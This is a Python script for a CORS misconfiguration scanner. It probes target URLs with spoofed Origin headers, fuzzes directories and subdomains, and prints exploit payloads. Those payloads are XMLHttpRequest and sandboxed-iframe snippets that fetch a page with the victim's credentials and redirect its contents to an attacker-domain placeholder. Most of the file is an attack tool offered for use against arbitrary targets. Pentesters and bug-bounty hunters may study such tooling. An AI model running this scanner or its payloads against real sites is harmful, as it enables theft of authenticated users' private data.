import requests
import sys
from urllib.parse import urljoin
from colorama import Fore, Back, Style, init
from pyfiglet import figlet_format  # Install with: pip install pyfiglet
from concurrent.futures import ThreadPoolExecutor



def create_banner():
    init(autoreset=True)
    
    # Colorful ASCII art text
    ascii_banner = figlet_format("CORS Misconfig Scanner", font="slant")
    
    # Split into lines for multi-color effect
    lines = ascii_banner.split('\n')
    
    # Rainbow color sequence
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    
    # Print each line with different color
    for i, line in enumerate(lines):
        if line.strip():  # Only print non-empty lines
            print(colors[i % len(colors)] + line)
    
    # Decorative border with warning symbol
    border_length = max(len(line) for line in lines) - 10
    print(Fore.YELLOW + "⚠" + "═" * border_length + "⚠")
    print(Fore.WHITE + " " * 5 + "Scanning for Cross-Origin Vulnerabilities")
    print(Fore.YELLOW + "⚠" + "═" * border_length + "⚠")



def targets_list():
    try:
        with open(sys.argv[2], 'r') as targets:
            for target in targets:
                url = target.strip()
                print(f'Scanning : {url}\n')
                target_scan(url)

    except FileNotFoundError:
        return f"Error: can't open targets list"



def target_scan(target): 
  basic_origin = 'toxic.com'
  target_domain = f'{target.replace('https://', '').replace('http://', '')}'
  bypass_origins = [basic_origin, f'{target_domain}.toxic.com', f'www{target_domain}', f'toxic.com/{target_domain}', 'null']
  
  for origin in bypass_origins:
    req_headers = {'Origin': origin, 'User-Agent': 'Mozilla/5.0'}
    print(f'Trying payload (Origin: {origin})')
    
    try:

      resp = requests.get(target.strip(), headers=req_headers)
      orig = resp.headers.get('Access-Control-Allow-Origin')
      creds = resp.headers.get('Access-Control-Allow-Credentials')
      
   
      if (creds == 'True' and orig == origin and orig != 'null' and orig != '*'):
         print(f'The target is vulnerable\nPayload: {origin}\nExploitable headers:\nAccess-Control-Allow-Origin: {orig}\nAccess-Control-Allow-Credentials: {creds}')
         print(sensitive_dirs(target))
         print('\nExploit:')
         print("""var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','{{TARGET-URL}}',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='{{ATTACKER-DOMAIN}}'+this.responseText; 
};""")
         break
      
      elif (creds == 'True' and orig == 'null'):
         print(f'The target is vulnerable\nExploitable headers:\nAccess-Control-Allow-Origin: {orig}\nAccess-Control-Allow-Credentials: {creds}\n')
         print(sensitive_dirs(target))
         print('\nExploit: ')
         print('''<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','{{TARGET-URL}}',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='{{ATTACKER-DOMAIN}}'+encodeURIComponent(this.responseText);
   };
</script>"></iframe>''')
         break

      elif (not creds and orig == '*'):
         print(f'Possible Attack vector:\nAccess-Control-Allow-Origin: {orig}\nAccess-Control-Allow-Credentials: {creds}\n')
         print(sensitive_subdomains(target))
         print('\nExploit: ')
         print("""var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','{{TARGET-SUBDOMAIN}}',true); 
req.send();

function reqListener() {
    location='{{ATTACKER-DOMAIN}}'+this.responseText; 
};""")
         break
         
      else:
          print('No CORS headers detected')      
          

    except requests.exceptions.RequestException as e:
      print('Error: Failed to send request to the target.')
      print(e)
   
   
   
 

def sensitive_dirs(target):
    print('Scanning for sensitive endpoints for exploit')
    usr_wordlist = input("Enter a directory wordlist: ")
    print('Fuzzing start')
    if not usr_wordlist: 
        sys.exit("No wordlist provided. Exiting...")

    try:
        with open(usr_wordlist, 'r') as wordlist:
            words = [line.strip() for line in wordlist if line.strip()]
    except FileNotFoundError:
        return f"Error: Could not open wordlist file: {usr_wordlist}"

    found = []

    def check_dir(word):
        url = urljoin(target, word)
        print(f'Targeting: {url}')
        try:
            res = requests.get(url, timeout=7)
            if res.status_code == 401:
                print(f"Sensitive directory found: {url}")
                found.append(f"Sensitive directory found: {url}")
        except requests.RequestException:
            pass

    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(check_dir, words)

    return '\n\n'.join(found) if found else 'No sensitive directories found (No worries still exploitable)'





def sensitive_subdomains(target):
    
    sensitive_subdomain = []
    print('Scanning for sensitive subdomains for exploit')
    usr_wordlist = input("Enter a subdomains wordlist: ")
    print('Start Fuzzing ')
    if not usr_wordlist :
       sys.exit("No wordlist provided. Exiting...")

     
    if target.startswith('http://'):
        prefix = 'http://'
        domain = target[len('http://'):]
    elif target.startswith('https://'):
        prefix = 'https://'
        domain = target[len('https://'):]
    else:
        prefix = ''
        
        
    try:
        with open(usr_wordlist, 'r') as wordlist:
            fuzz = [f'{prefix}{subdomain.strip()}.{domain}' for subdomain in wordlist if subdomain.strip()]
    except FileNotFoundError:
        return f"Error: Could not open wordlist file: {usr_wordlist}"
    
        
    def check_subdomain(word):
        print(f'Targeting: {word}')
        try:
           res = requests.get(word, timeout=7)
           if res.status_code == 403:
                print(f'Sensitive subdomain found: {word}')
                sensitive_subdomain.append(f'Sensitive subdomain found: {word}')
        except requests.RequestException:
                  pass

    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(check_subdomain, fuzz)

    return '\n\n'.join(sensitive_subdomain) if sensitive_subdomain else 'No sensitive subdomains found (May be need more recon :) )'

   
       
       
def help():
     print('Usage: python wood.py [arguments]\n\nAvailable arguments:\n-u, --url: The target URL (-u http://example.com)\n-h, --help View help list\n-l, --list: Enter a list of targets\n\nUsage examples:\n\npython wood.py -u https://example.com \npython wood.py --list targets.txt')




def main():
     if len(sys.argv) < 3 or sys.argv[1] not in ['-u', '--url', '-l', '--list']:
        help()
     elif (sys.argv[1] == '-u' or sys.argv[1] == '--url'):
        target_scan(sys.argv[2])
     elif (sys.argv[1] == '-l' or sys.argv[1] == '--list'):
        targets_list()
     
     
     
if __name__ == '__main__':
    create_banner()
    main()

